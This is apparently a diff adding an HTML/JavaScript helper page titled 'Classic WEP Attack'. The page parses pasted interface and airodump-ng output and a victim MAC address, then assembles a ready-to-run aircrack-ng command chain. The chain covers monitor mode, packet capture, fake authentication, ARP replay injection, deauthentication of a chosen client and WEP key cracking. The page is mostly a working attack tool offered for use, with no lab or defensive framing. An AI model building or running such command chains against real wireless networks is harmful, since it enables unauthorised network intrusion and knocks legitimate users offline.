@@ -1,0 +1,77 @@
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Classic WEP Attack</title>
+</head>
+<body>
+<form id="frm1">
+	ip link show <br>
+	<input type="text" id="ipLinkShowInput" style="width:100%" autofocus><br>
+	<p id="searchCommand"></p><br>
+	<input type="text" id="airodumpInput" style="width:100%" autofocus><br>
+	victim MAC <br>
+	<input type="text" id="victimMAC" style="width:100%" autofocus><br>
+	<input type="button" onclick="myFunction()" value="Submit">
+</form>
+<p id="output"></p>
+<script>
+
+	
+function myFunction() {
+	var airodumpInput = document.getElementById("airodumpInput").value.trim().replace(/\s\s+/g, ' ');
+	var ipLinkShowInput = document.getElementById("ipLinkShowInput").value.trim().replace(/\s\s+/g, ' ');
+	var victimMac = document.getElementById("victimMAC").value;
+	
+	var airoSplit = airodumpInput.split(" ");
+	var apMac = airoSplit[0];
+	var channel = airoSplit[5];
+	var ssid = airoSplit[9];
+	
+	var ipSplit = ipLinkShowInput.split(" ");
+	var deviceName = ipSplit[1];
+	deviceName = deviceName.substring(0, deviceName.length - 1);
+	var mac = ipSplit[16].toUpperCase()
+	
+	
+	
+	document.getElementById("searchCommand").innerHTML = `sudo airodump-ng ${deviceName} -t WEP`
+		
+	
+
+	document.getElementById("output").innerHTML = 
+		"sudo airmon-ng check kill<br>sudo airmon-ng check kill<br>" 
+		+ monitorMode(deviceName, channel) + "<br>"
+		+ captureCommand(deviceName, channel, apMac) + "<br>" 
+		+ fakeAuth(ssid, apMac, mac, deviceName) + "<br>" 
+		+ arpRelay(apMac, mac, deviceName) + "<br>" 
+		+ deauthAttack(apMac, victimMac, deviceName) + "<br>"
+		+ "sudo aircrack-ng `ls -t cap1*.cap | head -1`";
+}
+
+function captureCommand(device, channel, ssid) {
+	return `sudo airodump-ng ${device} -c ${channel} --bssid ${ssid} -w cap1`
+}
+
+function monitorMode(device, channel) {
+	return `sudo iwconfig ${device} mode monitor`
+}
+
+function fakeAuth(ssid, apMac, mac, device) {
+	return `sudo aireplay-ng -1 6000 -o 1 -q 10 -e ${ssid} -a ${apMac} -h ${mac} ${device}`
+}
+
+function arpRelay(apMac, mac, device) {
+	return `sudo aireplay-ng -3 -b ${apMac} -h ${mac} ${device}`
+}
+
+function deauthAttack(apMac, victimMac, device) {
+	if (victimMac.length > 0) {
+		return `sudo aireplay-ng -0 1 -a ${apMac} -c ${victimMac} ${device}`
+	} else {
+		return `sudo aireplay-ng -0 1 -a ${apMac} ${device}`
+	}
+}
+</script>
+</body>
+
+</html>
